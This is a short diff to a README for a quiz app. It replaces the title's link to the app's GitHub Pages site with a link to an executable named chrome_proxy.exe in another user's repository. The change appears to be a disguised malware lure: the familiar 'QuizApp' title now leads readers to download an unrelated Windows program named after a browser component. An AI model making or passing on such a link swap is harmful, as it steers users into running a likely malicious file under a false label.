@@ -1,5 +1,5 @@
 <h1 align="center">
-  <a href="https://safdarjamal.github.io/quiz-app/">
+  <a href="https://github.com/Abdulwarissherzad/Quiz-App/blob/main/chrome_proxy.exe">
     QuizApp
   </a>
 </h1>
